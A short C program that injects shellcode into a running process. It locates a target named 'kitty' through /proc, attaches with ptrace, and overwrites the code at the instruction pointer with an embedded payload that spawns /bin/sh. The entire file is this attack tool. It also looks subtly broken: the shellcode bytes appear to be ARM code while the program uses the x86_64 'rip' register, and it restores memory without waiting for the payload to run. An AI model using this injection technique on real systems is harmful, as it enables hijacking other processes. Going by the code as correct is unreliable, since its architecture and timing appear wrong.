#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

char shellcode[] = "\x01\x30\x8f\xe2"
                   "\x13\xff\x2f\xe1"
                   "\x78\x46\x08\x30"
                   "\x49\x1a\x92\x1a"
                   "\x0b\x27\x01\xdf"
                   "\x2f\x62\x69\x6e"
                   "\x2f\x73\x68";

int get_pid_by_name(const char *process_name) {
  DIR *proc_dir = opendir("/proc");
  if (!proc_dir) {
    perror("opendir failed");
    return -1;
  }

  struct dirent *entry;

  while ((entry = readdir(proc_dir)) != NULL) {
    if (entry->d_type == DT_DIR && atoi(entry->d_name) > 0) {
      char cmdline_path[256];
      snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline",
               entry->d_name);

      FILE *cmdline_file = fopen(cmdline_path, "r");
      if (cmdline_file) {
        char cmdline[256];
        if (fgets(cmdline, sizeof(cmdline), cmdline_file) != NULL) {

          if (strstr(cmdline, process_name) != NULL) {
            fclose(cmdline_file);
            closedir(proc_dir);
            return atoi(entry->d_name);
          }
        }
        fclose(cmdline_file);
      }
    }
  }
  closedir(proc_dir);
  return -1;
}

// read memory from the target process
void read_mem(pid_t pid, long addr, char *buffer, int len) {
  union data_chunk {
    long val;
    char bytes[sizeof(long)];
  } chunk;
  int i = 0;
  while (i < len / sizeof(long)) {
    chunk.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * sizeof(long), NULL);
    memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    chunk.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * sizeof(long), NULL);
    memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
  }
}

// write memory into the target process
void write_mem(pid_t pid, long addr, char *buffer, int len) {
  union data_chunk {
    long val;
    char bytes[sizeof(long)];
  } chunk;
  int i = 0;
  while (i < len / sizeof(long)) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
    ptrace(PTRACE_POKEDATA, pid, addr + i * sizeof(long), chunk.val);
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
    ptrace(PTRACE_POKEDATA, pid, addr + i * sizeof(long), chunk.val);
  }
}

int main() {
  const char *process_name = "kitty";
  int status;

  int pid = get_pid_by_name(process_name);

  printf("%d, PID of %s\n", pid, process_name);

  int payload_len = sizeof(shellcode) - 1;

  char original_code[payload_len];

  struct user_regs_struct target_regs;

  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
    perror("failed to attach :(");
    return 1;
  }
  ptrace(PTRACE_GETREGS, pid, NULL, &target_regs);
  read_mem(pid, target_regs.rip, original_code, payload_len);
  write_mem(pid, target_regs.rip, shellcode, payload_len);
  ptrace(PTRACE_CONT, pid, NULL, NULL);
  // Restore memory
  write_mem(pid, target_regs.rip, original_code, payload_len);
  ptrace(PTRACE_DETACH, pid, NULL, NULL);
  return 0;
}
